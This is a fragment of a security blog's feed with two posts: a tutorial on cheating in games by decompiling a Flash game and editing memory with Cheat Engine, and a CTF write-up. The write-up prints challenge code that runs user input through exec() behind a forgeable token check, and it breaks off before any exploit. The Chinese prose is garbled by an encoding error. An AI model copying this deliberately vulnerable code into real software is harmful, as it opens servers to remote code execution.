    <id>http://c1oudfl0w0.github.io/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/</id>
    <published>2024-12-11T13:48:45.000Z</published>
    <updated>2024-12-12T02:28:33.415Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å˜å§†ï¼Œå˜å§†~</p><span id="more"></span><hr><h1 id="Flashæ¸¸æˆé€†å‘"><a href="#Flashæ¸¸æˆé€†å‘" class="headerlink" title="Flashæ¸¸æˆé€†å‘"></a>Flashæ¸¸æˆé€†å‘</h1><h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><p>å¤§éƒ¨åˆ†çš„ç½‘é¡µå°æ¸¸æˆéƒ½æ˜¯é€šè¿‡ Flash è¿›è¡Œåˆ¶ä½œçš„ï¼Œæƒ³è¦ä¿®æ”¹ç½‘é¡µå°æ¸¸æˆçš„è®¾ç½®ï¼Œæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°å®ƒçš„åº•å±‚ä»£ç ï¼Œæ‰€ä»¥å°†ç½‘é¡µç‰ˆæœ¬çš„å°æ¸¸æˆä¸‹è½½åï¼Œåç¼–è¯‘å¹¶åˆ†æå…¶ä»£ç ç„¶åæ›´æ”¹æœ‰å…³äººç‰©æ•°æ®ï¼Œè¿›è€Œå¯ä»¥è¾¾æˆâ€œå¤–æŒ‚â€ç›®çš„</p><p>åœ¨æµè§ˆå™¨ä¸­æ¸¸ç©ç½‘é¡µå°æ¸¸æˆæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ F12 é”®ï¼Œæ‰¾åˆ°ä¸€ä¸ªåç¼€ä¸º.swf çš„å¯ä¸‹è½½æ–‡ä»¶ï¼Œæˆ–è€…åœ¨è®¾ç½®ä¸­çš„ Internet é€‰é¡¹ï¼Œåœ¨ä¸´æ—¶æ–‡ä»¶ä¸­æŸ¥çœ‹ swf æ–‡ä»¶ï¼Œè¿™å°±æ˜¯ç½‘é¡µå°æ¸¸æˆçš„è¿è¡ŒåŸºç¡€ã€‚åœ¨ä¸‹è½½å¥½è¯¥æ–‡ä»¶ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åç¼–è¯‘å¾—åˆ°æ¸¸æˆçš„è¿è¡Œä»£ç äº†ã€‚</p><h3 id="JPEXS-åç¼–è¯‘å¹¶ä¿®æ”¹"><a href="#JPEXS-åç¼–è¯‘å¹¶ä¿®æ”¹" class="headerlink" title="JPEXS åç¼–è¯‘å¹¶ä¿®æ”¹"></a>JPEXS åç¼–è¯‘å¹¶ä¿®æ”¹</h3><p>é¦–å…ˆï¼Œéœ€è¦åœ¨æ¸¸æˆç½‘é¡µä¸Šå°†å°æ¸¸æˆä¸‹è½½ä¸‹æ¥ï¼ˆswf åç¼€çš„æ–‡ä»¶å³æ˜¯ï¼‰ï¼Œé€šè¿‡ JPEXS Free Flash Decompiler å¯¹æ­¤ swf æ–‡ä»¶è¿›è¡Œåç¼–è¯‘ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°è¯¥æ¸¸æˆçš„ç»„æˆä»£ç ã€æ¶æ„ç­‰ä¿¡æ¯</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212002301635.png" alt="image-20241212002301635"></p><p>ç»„æˆè¯¥æ¸¸æˆçš„åŸºç¡€ä»£ç éƒ½åœ¨â€œè„šæœ¬â€æ ç›®ä¸­ï¼Œå…¶ä¸­çš„ frame æ–‡ä»¶å­˜æ”¾äº†å…³é”®ä»£ç ï¼Œå®šä½â€œHPâ€å­—èŠ‚</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212002621071.png" alt="image-20241212002621071"></p><p>æˆ‘ä»¬å¯ä»¥æŸ¥æ‰¾åˆ°éœ€è¦ä¿®æ”¹çš„ä»£ç æ®µçš„å…·ä½“ä½ç½®ï¼Œä¿®æ”¹å¯¹åº”çš„ P ä»£ç èµ„æºï¼Œå¯¹ä¿®æ”¹åçš„ .swf æ–‡ä»¶è¿›è¡Œä¿å­˜</p><p>å…ˆä¿®æ”¹äººç‰©ä¸»äººå…¬çš„è¡€é‡ï¼Œé€šè¿‡æœç´¢â€œhpâ€æ¥æŸ¥çœ‹ç›¸å…³ä¿¡æ¯</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212003010043.png" alt="image-20241212003010043"></p><p>ä¿®æ”¹è¿™é‡Œçš„ Base_hp å’Œ Now_hp</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212003318287.png" alt="image-20241212003318287"></p><p>ä¿®æ”¹å®Œæˆåç‚¹å‡»å¦å­˜ä¸ºåˆ°æ¡Œé¢</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212003422363.png" alt="image-20241212003422363"></p><p>é‡æ–°è¿è¡Œæ¸¸æˆæ–‡ä»¶ä¼šå‘ç°æ¸¸æˆå†…å®¹çš„æ•°å€¼å·²ç»è¢«æ›´æ”¹</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212004114526.png" alt="image-20241212004114526"></p><hr><h1 id="CE-é€†å‘-Super-Mario-XP"><a href="#CE-é€†å‘-Super-Mario-XP" class="headerlink" title="CE é€†å‘ Super Mario XP"></a>CE é€†å‘ Super Mario XP</h1><p>ä¸»è¦ç›®çš„ä¸ºï¼šé€šè¿‡æ‰«æå†…å­˜åœ°å€å®ç°æ— é™å­å¼¹å’Œä¿®æ”¹æ¸¸æˆæ•°æ®ï¼ŒåŒ…æ‹¬å¯»æ‰¾åŠ¨æ€åœ°å€ã€é”å®šå€¼ã€ä¿®æ”¹é™æ€åœ°å€ç­‰å†…å®¹ã€‚</p><h2 id="æ­¥éª¤-1"><a href="#æ­¥éª¤-1" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><p>æ‰“å¼€ cheat engine åŠ è½½æ¸¸æˆè¿›ç¨‹</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212010210915.png" alt="image-20241212010210915"></p><p>åœ¨å¯ç”¨ CE æ—¶ï¼Œæˆ‘ä»¬éœ€è¦é”å®šçš„ç›®æ ‡æ•°å€¼ä¸º 10ï¼ˆå³å½“å‰çš„çº¢å¿ƒæ•°ï¼‰ï¼Œé‚£ä¹ˆåœ¨ CE çª—å£ä¸­éœ€è¦è¾“å…¥ç›¸å¯¹äºçš„æ•°å€¼è¿›è¡ŒåŒ¹é…ï¼Œè¾“å…¥å®Œæˆåï¼Œç‚¹å‡»â€œå¼€å§‹æ‰«æâ€</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212010331719.png" alt="image-20241212010331719"></p><p>åœ¨æ¸¸æˆé‡Œè·å–çº¢å¿ƒï¼Œæ¯”è¾ƒå‰åå€¼çš„å˜åŠ¨å‘ç°çº¢å¿ƒæ•°å€¼å†…å­˜åœ°å€</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212010531502.png" alt="image-20241212010531502"></p><p>å³é”®ä¿®æ”¹valueï¼Œç„¶åå¯¹æ¸¸æˆè¿›è¡Œæ“ä½œä¸€ä¸‹ä½¿å¾—æ•°å€¼è¿›è¡Œå˜æ¢</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212010800580.png" alt="image-20241212010800580"></p><p>æˆåŠŸæ‰¾åˆ°ç”Ÿå‘½å€¼å¯¹åº”çš„åœ°å€ 001EC578ï¼Œä»è€Œä¿®æ”¹ç”Ÿå‘½å€¼&#x2F;å­å¼¹æ•°</p><hr><h1 id="Run-ZombieFoods"><a href="#Run-ZombieFoods" class="headerlink" title="Run!ZombieFoods!"></a>Run!ZombieFoods!</h1><h2 id="æ­¥éª¤-2"><a href="#æ­¥éª¤-2" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><p>åœ¨CEä¸­åŠ è½½è¯¥è¿›ç¨‹</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212015153532.png" alt="image-20241212015153532"></p><p>æˆ‘ä»¬è¿è¡Œæ¸¸æˆåï¼Œåˆå§‹æ‰«æçš„æ•°å€¼æ˜¯ 0&amp;98</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212015417475.png" alt="image-20241212015417475"></p><p>åœ¨æ¸¸æˆä¸­ç­‰åˆ°é£Ÿç‰©è¿›è¡Œæ¶ˆè€—åå†æ¬¡æ‰«ææ–°çš„æ•°å€¼ï¼Œè¿™ä¼šæ–¹ä¾¿æˆ‘ä»¬æ‰¾åˆ°å¯¹åº”çš„å†…å­˜åœ°å€ï¼š</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212015533732.png" alt="image-20241212015533732"></p><p>å¾—åˆ°æœ‰ä¸¤ä¸ªåœ°å€ç¬¦åˆå³ 1186555C å’Œ 11CA2FD0</p><p>æˆ‘ä»¬åˆ†åˆ«å¯¹å…¶è¿›è¡Œä¿®æ”¹é”å®šï¼Œå…ˆå¯¹ 1186555C å€¼ä¿®æ”¹ä¸º 2221 å¹¶æ¿€æ´»é”å®š</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212015727628.png" alt="image-20241212015727628"></p><p>å›åˆ°æ¸¸æˆå‘ç°é£Ÿç‰©æ•°é‡é”å®šåœ¨2221ä¸ä¼šä¸‹é™ï¼Œè¯´æ˜è¿™å°±æ˜¯é£Ÿç‰©çš„çœŸå®å†…å­˜åœ°å€ï¼š1186555C</p><p>åŒç†ï¼Œæˆ‘ä»¬å¯ä»¥é”å­å¼¹</p><p>é¦–å…ˆç”¨åŒæ ·çš„æ–¹å¼æ‰¾åˆ°å­å¼¹çš„å†…å­˜åœ°å€</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212020240813.png" alt="image-20241212020240813"></p><p>ä¾æ—§æ˜¯åŒåœ°å€ï¼Œè¿™æ¬¡ä¸€èµ·æ”¹ä¸€èµ·é”ä¸Šï¼Œåˆ†åˆ«æ˜¯ 11865558 å’Œ 11CA2FCC</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212020526497.png" alt="image-20241212020526497"></p><p>åœ¨å¯¹ Super Mario XP çš„æ— é™å­å¼¹å’Œ Run!ZombieFoods! çš„æ— é™é£Ÿç‰©å’Œå­å¼¹è¿›è¡Œé€†å‘å†…å­˜åœ°å€ä¿®æ”¹æ•°å€¼åï¼Œå‘ç°è¿™äº›æ•°å€¼çš„å†…å­˜åœ°å€ç¦»çš„å¾ˆè¿‘ã€‚å‘ç°æœ‰æ—¶å€™ Cheat Engine æ‰«ææŒ‡å®šä¸œè¥¿çš„å¤šæ¬¡å˜åŒ–æ•°å€¼åï¼Œä»ç„¶å¯èƒ½å­˜åœ¨å¤šä¸ªåœ°å€ï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨äºŒåˆ†æ³•ï¼Œå¯¹ä¸€åŠæ•°å€¼è¿›è¡Œä¿®æ”¹ï¼Œè‹¥æ¸¸æˆå†…æ— å˜åŒ–åˆ™å†…å­˜åœ°å€åœ¨å¦ä¸€åŠä¸­ï¼›è‹¥æ¸¸æˆå†…æœ‰å˜åŒ–åˆ™å†…å­˜åœ°å€åœ¨è¿™ä¸€åŠå½“ä¸­ï¼Œå¤šæ¬¡åå³å¯å‘ç°çœŸæ­£çš„å†…å­˜åœ°å€ã€‚æœ€åè¿›è¡Œæ•°å€¼ä¿®æ”¹ä¸é”å®šï¼Œä»è€Œè¾¾åˆ°æ— é™çš„ä¼˜åŠ¿</p><hr><h1 id="CS1-6"><a href="#CS1-6" class="headerlink" title="CS1.6"></a>CS1.6</h1><h2 id="æ­¥éª¤-3"><a href="#æ­¥éª¤-3" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><p>å¯åŠ¨ CS æ¸¸æˆå¼€å¯å¯¹å±€ï¼Œè¿›ç¨‹æ”¾å…¥ CE ä¸­</p><p>è§‚å¯Ÿåˆ°æ‰‹æªå­å¼¹æ•°ä¸º20ï¼Œæ‰«æä¸€ä¸‹ï¼Œå‘ç°æœ‰éƒ¨åˆ†å†…å­˜åœ°å€çš„å€¼ä¼šç«‹åˆ»å˜åŠ¨ï¼Œç„¶åå†æ¬¡æ‰«æç›´åˆ°åœ°å€æ•°å€¼ç»“æœä¸å†å˜åŒ–ä¸ºæ­¢</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212094521629.png" alt="image-20241212094521629"></p><p>æ‰«å‡º2000æ¡ï¼Œç°åœ¨å¼€ä¸€æªï¼Œæ‰«æ19ç›´åˆ°åœ°å€æ•°å€¼ä¸å†å˜åŒ–</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212094633151.png" alt="image-20241212094633151"></p><p>ç°åœ¨æ˜¯196æ¡ï¼Œé‡å¤æ“ä½œè¿›è¡Œæ‰«æ</p><p>å‘ç°ä¾æ—§æ˜¯196æ¡</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212095001818.png" alt="image-20241212095001818"></p><p>Ctrl+A å³é”®é€‰ä¸­æ‰€æœ‰åœ°å€ç»“æœï¼Œç„¶åå³é”®â€œåŠ å…¥é€‰æ‹©çš„åœ°å€åˆ°åœ°å€æ¸…å•â€</p><p>ç»“åˆäºŒåˆ†æ³•ï¼ŒæŒ‰ä½ Shift é”®é€‰ä¸­ä¸€åŠåœ°å€å†…å®¹ï¼Œå³é”®æ›´æ”¹è®°å½•æ•°å€¼ä¸º 20ã€‚</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212095242790.png" alt="image-20241212095242790"></p><p>è§‚å¯Ÿå­å¼¹æ•°ï¼Œå˜æˆäº† 20ï¼Œä½†æ˜¯ç‚¹å‡»å°„å‡»åå˜æˆäº† 13 è€Œä¸æ˜¯ 19ï¼Œè¯´æ˜ä¿å­˜æ‰‹æªå­å¼¹æ•°çš„åœ°å€ä¸åœ¨é€‰ä¸­çš„éƒ¨åˆ†ï¼Œåˆ™åˆ é™¤å‰é¢é€‰ä¸­éƒ¨åˆ†çš„åœ°å€</p><p>ç”¨äºŒåˆ†æ³•é‡å¤ä¸Šé¢çš„æ“ä½œ</p><p>æœ€åæµ‹å‡ºæ¥ç»“æœæ˜¯042BBE74</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212095919344.png" alt="image-20241212095919344"></p><p>ç›´æ¥é”ä½å­å¼¹æ•°</p><p><img src="/blog/2024/12/11/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/image-20241212100012051.png" alt="image-20241212100012051"></p><p>è¿ç»­å¼€æªä¸æ‰å­å¼¹ï¼ŒéªŒè¯æˆåŠŸ</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å˜å§†ï¼Œå˜å§†~&lt;/p&gt;</summary>
    
    
    
    <category term="Rev" scheme="http://c1oudfl0w0.github.io/blog/categories/Rev/"/>
    
    
  </entry>
  
  <entry>
    <title>å¼ºç½‘æ¯S8 Final</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/</id>
    <published>2024-12-05T00:35:46.000Z</published>
    <updated>2024-12-09T14:41:42.283Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æˆ‘å¤§æ¦‚ä¸€è¾ˆå­éƒ½å¿˜ä¸äº†å¼ºç½‘æ¯äº†å§</p><span id="more"></span><p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206181319593.png" alt="image-20241206181319593"></p><p>æ²¡æœ‰çˆ†é›¶ï¼Œä¸æ˜¯å«åº•ï¼Œä½œä¸ºä¸€ä¸ªå†å²çŸ­æš‚çš„åŒéæ ¡é˜Ÿå·²ç»è¿œè¶…é¢„æœŸäº†ï¼ˆç¬‘ï¼‰</p><hr><h1 id="Jeopardy"><a href="#Jeopardy" class="headerlink" title="Jeopardy"></a>Jeopardy</h1><h2 id="Pharaohâ€™s-Pyramid"><a href="#Pharaohâ€™s-Pyramid" class="headerlink" title="Pharaohâ€™s Pyramid"></a>Pharaohâ€™s Pyramid</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> wsgiref<span class="token punctuation">.</span>simple_server <span class="token keyword">import</span> make_server<span class="token keyword">from</span> pyramid<span class="token punctuation">.</span>config <span class="token keyword">import</span> Configurator<span class="token keyword">from</span> pyramid<span class="token punctuation">.</span>events <span class="token keyword">import</span> NewResponse<span class="token keyword">from</span> pyramid<span class="token punctuation">.</span>response <span class="token keyword">import</span> Response<span class="token keyword">import</span> utilusers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>super_user <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span>default_alg <span class="token operator">=</span> <span class="token string">"RS"</span><span class="token keyword">def</span> <span class="token function">register_api</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> username <span class="token keyword">in</span> super_user<span class="token punctuation">:</span>            <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">"Not Allowed!"</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Please Input username &amp; password'</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token string">"500 Internal Server"</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">&#125;</span>    users<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    token <span class="token operator">=</span> util<span class="token punctuation">.</span>data_encode<span class="token punctuation">(</span>data<span class="token punctuation">,</span> default_alg<span class="token punctuation">)</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">"Here is your token: "</span><span class="token operator">+</span> token<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register_front</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>util<span class="token punctuation">.</span>read_html<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">front_test</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>util<span class="token punctuation">.</span>read_html<span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">system_test</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span>        token <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>        data <span class="token operator">=</span> util<span class="token punctuation">.</span>data_decode<span class="token punctuation">(</span>token<span class="token punctuation">)</span>        <span class="token keyword">if</span> data<span class="token punctuation">:</span>            username <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span>            <span class="token keyword">if</span> username <span class="token keyword">in</span> super_user<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome super_user!"</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Unauthorized'</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token string">"401 Unauthorized"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Unauthorized'</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token string">"401 Unauthorized"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Please Input code &amp; token'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">"Success!"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> Configurator<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> config<span class="token punctuation">:</span>        config<span class="token punctuation">.</span>add_route<span class="token punctuation">(</span><span class="token string">'register_front'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span>        config<span class="token punctuation">.</span>add_route<span class="token punctuation">(</span><span class="token string">'register_api'</span><span class="token punctuation">,</span> <span class="token string">'/api/register'</span><span class="token punctuation">)</span>        config<span class="token punctuation">.</span>add_route<span class="token punctuation">(</span><span class="token string">'system_test'</span><span class="token punctuation">,</span> <span class="token string">'/api/test'</span><span class="token punctuation">)</span>        config<span class="token punctuation">.</span>add_route<span class="token punctuation">(</span><span class="token string">'front_test'</span><span class="token punctuation">,</span> <span class="token string">'/test'</span><span class="token punctuation">)</span>        config<span class="token punctuation">.</span>add_view<span class="token punctuation">(</span>system_test<span class="token punctuation">,</span> route_name<span class="token operator">=</span><span class="token string">'system_test'</span><span class="token punctuation">)</span>        config<span class="token punctuation">.</span>add_view<span class="token punctuation">(</span>front_test<span class="token punctuation">,</span> route_name<span class="token operator">=</span><span class="token string">'front_test'</span><span class="token punctuation">)</span>        config<span class="token punctuation">.</span>add_view<span class="token punctuation">(</span>register_api<span class="token punctuation">,</span> route_name<span class="token operator">=</span><span class="token string">'register_api'</span><span class="token punctuation">)</span>        config<span class="token punctuation">.</span>add_view<span class="token punctuation">(</span>register_front<span class="token punctuation">,</span> route_name<span class="token operator">=</span><span class="token string">'register_front'</span><span class="token punctuation">)</span>        app <span class="token operator">=</span> config<span class="token punctuation">.</span>make_wsgi_app<span class="token punctuation">(</span><span class="token punctuation">)</span>    server <span class="token operator">=</span> make_server<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">6543</span><span class="token punctuation">,</span> app<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®¡è®¡ä»£ç ï¼Œåªéœ€è¦ä»¥ admin ç™»å½•å°±èƒ½ rce</p><p>è§‚å¯Ÿæ³¨å†Œè·å–jwtçš„éƒ¨åˆ†ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">users <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>super_user <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span>default_alg <span class="token operator">=</span> <span class="token string">"RS"</span>users<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>token <span class="token operator">=</span> util<span class="token punctuation">.</span>data_encode<span class="token punctuation">(</span>data<span class="token punctuation">,</span> default_alg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·Ÿè¿›</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">data_encode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> alg<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> alg <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'HS'</span><span class="token punctuation">,</span> <span class="token string">'RS'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> <span class="token string">"Algorithm must be HS or RS!"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        private_key<span class="token punctuation">,</span> public_key <span class="token operator">=</span> generate_keys<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> alg <span class="token operator">==</span> <span class="token string">'RS'</span><span class="token punctuation">:</span>            signature <span class="token operator">=</span> sign_data<span class="token punctuation">(</span>private_key<span class="token punctuation">,</span> data<span class="token punctuation">)</span>            data_bytes <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            encoded_data1 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>  <span class="token comment"># data</span>            encoded_data2 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>signature<span class="token punctuation">)</span>  <span class="token comment"># signature</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>encoded_data2<span class="token punctuation">)</span>            encoded_data3 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>alg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># alg</span>            encoded_data4 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>public_key<span class="token punctuation">)</span>  <span class="token comment"># public_key</span>            encoded_data <span class="token operator">=</span> encoded_data1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> encoded_data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> encoded_data3<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> encoded_data4<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The encoded data is: "</span><span class="token punctuation">,</span> encoded_data<span class="token punctuation">)</span>            <span class="token keyword">return</span> encoded_data        <span class="token keyword">else</span><span class="token punctuation">:</span>            hash_object <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>            data_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            inputdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token 